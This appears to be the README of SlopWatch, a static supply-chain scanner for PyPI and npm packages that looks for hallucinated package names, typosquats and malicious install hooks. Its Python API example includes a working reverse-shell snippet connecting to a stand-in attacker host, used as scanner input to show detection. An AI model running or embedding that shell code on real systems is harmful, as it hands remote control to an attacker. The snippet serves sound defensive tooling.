# 🛡️ SlopWatch: Zero-LLM AI Hallucination & Supply Chain Threat Auditor

[![SlopWatch CI](https://github.com/royans/slopwatch/actions/workflows/ci.yml/badge.svg)](https://github.com/royans/slopwatch/actions/workflows/ci.yml)
[![PyPI Version](https://img.shields.io/pypi/v/slopwatch.svg)](https://pypi.org/project/slopwatch/)
[![Python Version](https://img.shields.io/badge/python-3.11%20%7C%203.12%20%7C%203.13-blue.svg)](https://pypi.org/project/slopwatch/)
[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
[![Engine](https://img.shields.io/badge/Core-Zero--LLM%20Deterministic-green.svg)](#architecture)

**SlopWatch** is a fast, deterministic supply chain security scanner for Python (PyPI) and JavaScript (npm) packages and lockfiles.

> **Zero-LLM · 200ms Scans · Zero API Keys · Runs Offline**

Designed for developers, CI/CD pipelines, and autonomous coding agents, SlopWatch protects against **AI package hallucinations** (when an LLM invents a plausible package name that an attacker registers) and **install-time execution traps** (`setup.py` hooks, `.pth` startup implants, npm lifecycle scripts) *before* dependencies touch your machine.

> **Live Audits**: SlopWatch was developed for the [FlagThis](https://flagthis.com) website. A working live demonstration that performs live supply chain audits and threat intelligence indexing is available at [FlagThis.com](https://flagthis.com).

```bash
# ⚡ Try it in 10 seconds (no config, no API keys)
pip install slopwatch
slopwatch check                    # auto-discovers and checks all manifests in project
slopwatch audit .                  # inspect local manifests and source files
```

---

## ⚡ Highlights & Key Capabilities

* **Zero-LLM Core Engine**: Fully deterministic execution via Python AST inspection, YARA signature scanning, and combinatorial heuristics. Zero probabilistic variance, zero external API costs, and sub-millisecond execution.
* **Deep Static AST Inspection**: Statically deconstructs Python `setup.py`, `pyproject.toml`, and module source code without dynamic code execution—detecting hidden reverse shells, raw sockets, eval-obfuscation, and child process execution.
* **npm Lifecycle Script Analysis**: Analyzes `package.json` hooks (`preinstall`, `install`, `postinstall`) and unpacks JS payloads for suspicious network exfiltration.
* **Pre-Compiled YARA Threat Engine**: Built-in YARA rules spanning 9 weaponization vectors: credentials, exfiltration, evasion, persistence, supply-chain hooks, and dropper logic.
* **Phantom Squatting & Typosquat Detection**: Identifies impersonations of high-value brands (Google, AWS, Stripe, Okta, Clerk, Supabase) using Levenshtein distance, token insertion, and delimiter swap heuristics.
* **AI Hallucination & Package Parking Auditor**: Scans project lockfiles and manifests (`requirements.txt`, `package.json`) to detect hallucinated package names frequently recommended by LLMs that do not exist or are parked by adversaries.
* **Version Confusion Anomaly Detection**: Surfaces suspicious version jumps (e.g. initial registrations claiming v99.0.0 or v50.0.0) while safely handling legitimate CalVer and date-stamped releases.

---

## 🚀 Installation & Quickstart

Install directly via pip:

```bash
pip install slopwatch
```

### System Prerequisites

SlopWatch uses `yara-python` for high-throughput compiled pattern matching. Most standard environments install pre-built wheels automatically. If installing in an environment requiring source compilation:

* **macOS**:
  ```bash
  brew install yara
  ```
* **Debian / Ubuntu**:
  ```bash
  sudo apt-get update && sudo apt-get install -y python3-dev gcc libssl-dev
  ```
* **Alpine Linux**:
  ```bash
  apk add --no-cache python3-dev gcc musl-dev libffi-dev
  ```

### Development Installation

To contribute or run from source:

```bash
git clone https://github.com/royans/slopwatch.git
cd slopwatch

python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
pip install -e .
```

---

## 💻 CLI Quickstart

The `slopwatch` command-line interface provides fast, rich terminal feedback for auditing and inspecting packages.

### 0. Protect a Project in 1 Second (`slopwatch init`)
Automatically configure project security, install native git pre-commit hooks, and set up CI/CD:

```bash
slopwatch init
```

* Automatically detects workspace manifests (`requirements.txt`, `pyproject.toml`, `package.json`).
* Creates `.slopwatch.yaml` (customizable allowlist & alert policies).
* Installs native `.git/hooks/pre-commit` so AI hallucinations can never be committed.
* Installs `.github/workflows/slopwatch.yml` for pull request auditing.
* Runs an immediate baseline audit across all project dependencies.

### 1. Check Project Manifests for Hallucinations
Run `slopwatch check` to automatically discover and audit **all** dependency manifests in your project (Python & npm):

```bash
slopwatch check                     # auto-discovers and audits all project manifests
slopwatch check requirements.txt    # or specify an individual file directly
slopwatch check ./backend           # or audit a specific subproject directory
```

* **Supported Manifests**: `requirements*.txt`, `pyproject.toml`, `Pipfile`, `Pipfile.lock`, `poetry.lock`, `package.json`, `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`.
* **What It Catches**: Hallucinated package names (404s on public registry), brand typosquats, and unpinned direct VCS URLs.

### 2. Deep Static AST Inspection of an Upstream Package
Fetch and statically inspect any published PyPI or npm package without executing its code:

```bash
slopwatch inspect requests --ecosystem pypi
slopwatch inspect express --ecosystem npm
```

### 3. Statically Scan Local Code or Directory
Run the AST analyzer and YARA rule engine across any local Python or JavaScript file/directory:

```bash
slopwatch scan ./src
slopwatch scan setup.py
```

### 4. Comprehensive Directory Audit
Audit an entire project directory, checking source files and manifests simultaneously:

```bash
slopwatch audit .
```

### 5. Engine Diagnostics & Rule Status
View engine statistics, active YARA rule suites, and loaded parking signatures:

```bash
slopwatch info
```

### 6. CI/CD & Pre-Commit Integration

SlopWatch supports machine-readable output (`--json`) and Git pre-commit hooks for CI/CD pipelines:

```bash
# Emit structured JSON for CI security gates or dashboard ingestion
slopwatch check --json
slopwatch audit . --json
```

Add SlopWatch to your project's `.pre-commit-config.yaml`:

```yaml
repos:
  - repo: https://github.com/royans/slopwatch
    rev: v0.1.0
    hooks:
      - id: slopwatch-check
      - id: slopwatch-audit
```

---

## ⚙️ Configuration & Whitelisting

SlopWatch is zero-config by default, but supports fine-grained tuning via `.slopwatch.yaml` or `pyproject.toml` (`[tool.slopwatch]`):

* **Whitelisting Private Packages (`allowlist`)**: Permit internal company SDKs, private mirrors, or vetted direct VCS URLs.
* **Alert & Failure Thresholds (`fail_on`)**: Control CI exit code behavior (`CRITICAL`, `HIGH` [default], `MEDIUM`, `ANY`).
* **Path Ignore Patterns (`ignore_paths`)**: Exclude test fixtures, mock data, or documentation.

👉 **Read the complete [SlopWatch Configuration Guide](docs/CONFIGURATION.md)** for syntax examples, rubric tables, and CI/CD recipes.

---

## 🐍 Python API Usage

SlopWatch can also be integrated directly into your own security tools and CI/CD pipelines:

```python
from slopwatch import YaraPatternScanner, PythonASTAssessor

# 1. Scan source code with the YARA threat engine
scanner = YaraPatternScanner()
matches = scanner.scan_text('''
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('evil.example.com', 4444))
os.dup2(s.fileno(), 0)
subprocess.call(['/bin/sh', '-i'])
''')

for match in matches:
    print(f"Detected: {match['rule']}")

# 2. Deep static AST analysis
assessor = PythonASTAssessor()
result = assessor.analyze_source("import base64; exec(base64.b64decode('...'))")
print(f"Threat Score: {result.composite_threat_score}/100")
print(f"Verdict: {result.verdict}")
```

---

<a id="architecture"></a>
## 🏗️ Architecture

```
┌───────────────────────────────────────────────────────────┐
│                    Target Input                           │
│     (Upstream Package Tarball, Manifest, or Local Source)  │
└─────────────────────────────┬─────────────────────────────┘
                              │
                              ▼
┌───────────────────────────────────────────────────────────┐
│              Deterministic Analysis Pipeline              │
│                                                           │
│  [1] Manifest & Metadata Sizing                           │
│      - Non-comment LOC & Codebase Tiering                 │
│      - Publisher Domain Proof vs Free Webmail Domain      │
│                                                           │
│  [2] Static AST Deconstruction (Zero Dynamic Execution)   │
│      - Python AST: setup.py / pyproject.toml hooks        │
│      - npm: package.json install hooks & lifecycle scripts│
│                                                           │
│  [3] Pre-Compiled YARA Engine                             │
│      - 9 Suites: Exfiltration, Shells, Persistence, etc.  │
│                                                           │
│  [4] Confidence-Weighted Scoring & Classification Matrix  │
│      - Normalized 0-1000 Threat Score                     │
│      - Bayesian confidence gate (per-rule HIGH/MED/LOW)   │
│      - Verdicts: MALICIOUS | SUSPICIOUS |                 │
│        UNVERIFIED_HIGH_SIGNAL | SQUATTED_STUB |           │
│        BENIGN_COMMUNITY | VERIFIED_OFFICIAL               │
└─────────────────────────────┬─────────────────────────────┘
                              │
                              ▼
┌───────────────────────────────────────────────────────────┐
│             Output: Structured JSON / Terminal CLI        │
└─────────────────────────────┬─────────────────────────────┘
                              │
                              ▼
     (Live community audits indexed at https://flagthis.com)
```

---

## 🔒 What SlopWatch Is & What It Isn’t

We believe security tools should be radically honest about their boundaries rather than overcommitting on claims.

### ✅ What SlopWatch IS:
* **A fast, deterministic first line of defense**: Runs in milliseconds via Python AST, compiled YARA signatures, and Levenshtein distance trees.
* **A detector for lazy automated weaponization**: Catches install-time socket connects, reverse shells, child process spawns in `setup.py`, malicious `.pth` startup files, Discord webhook exfiltration, and npm `preinstall` stealer payloads.
* **An auditor for AI package hallucinations**: Checks whether packages suggested by Copilot, Cursor, or ChatGPT actually exist on PyPI/npm or are parked slopsquats waiting for a developer to run `pip install`.
* **Respectful of maintainers**: Community libraries with ordinary telemetry or standard system calls are evaluated as `BENIGN_COMMUNITY`. The `MALICIOUS` verdict is strictly reserved for confirmed, active weaponization vectors.
* **Honest about uncertainty**: when the total score crosses a threat threshold but no individual signal behind it is, on its own, strong enough to justify confidently asserting malice, SlopWatch reports `UNVERIFIED_HIGH_SIGNAL` instead of `SUSPICIOUS`/`MALICIOUS` — a Bayesian confidence gate (per-rule HIGH/MEDIUM/LOW likelihood ratios) rather than treating every fired signal as equally damning. Real signal, not confirmed; worth a human look, not a false alarm.

### ❌ What SlopWatch IS NOT:
* **Not an omniscient hypervisor sandbox**: It performs zero dynamic code execution. It will not execute code in a VM or kernel sandbox to observe runtime behavior.
* **Not a binary decompiler**: If an attacker embeds compiled machine code inside a native `.so`, `.dylib`, or `.node` file, SlopWatch flags the presence of unexpected native binaries (`BUNDLED_NATIVE_BINARY`), but it does not reverse-engineer the compiled C/Rust assembly.
* **Not a silver bullet**: Static analysis is inherently an adversarial cat-and-mouse game. High-entropy custom runtime encoders or multi-stage split downloaders can be designed to evade static regex. SlopWatch catches the bulk of automated supply chain attacks instantly without the latency, cost, or prompt-injection vulnerabilities of LLMs.

---

## 🤝 Contributing

Contributions are welcome! Please run our pre-submit gatekeeper before opening a pull request:

```bash
# Install git hooks
./scripts/install_hooks.sh

# Run pre-submit checks manually
python3 scripts/presubmit.py

# Run test suite
pytest tests/ -v
```

---

## 📄 License

Licensed under the [Apache License, Version 2.0](LICENSE).
